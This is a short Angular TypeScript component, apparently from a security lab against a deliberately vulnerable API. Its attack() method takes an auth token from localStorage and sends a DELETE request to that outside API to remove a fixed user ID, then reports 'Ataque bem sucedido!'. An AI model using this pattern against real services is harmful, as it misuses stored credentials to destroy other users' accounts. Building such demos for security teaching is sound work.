import { Component } from '@angular/core';
import { HttpClient, HttpHeaders } from '@angular/common/http';

@Component({
  selector: 'app-attack',
  templateUrl: './attack.component.html',
  styleUrls: ['./attack.component.css']
})
export class AttackComponent {
  constructor(private http: HttpClient) {}

  attack() {
    const token = localStorage.getItem("auth-token");
    
    fetch('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
      method: 'DELETE',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    })
    .then(response => {
      if (response.ok) {
        alert('Ataque bem sucedido!');
      } else {
        throw new Error(`Falha na requisição: ${response.status}`);
      }
    })
    .catch(error => {
      console.error('Erro:', error);
      alert('Falha no ataque: ' + error.message);
    });
  }
}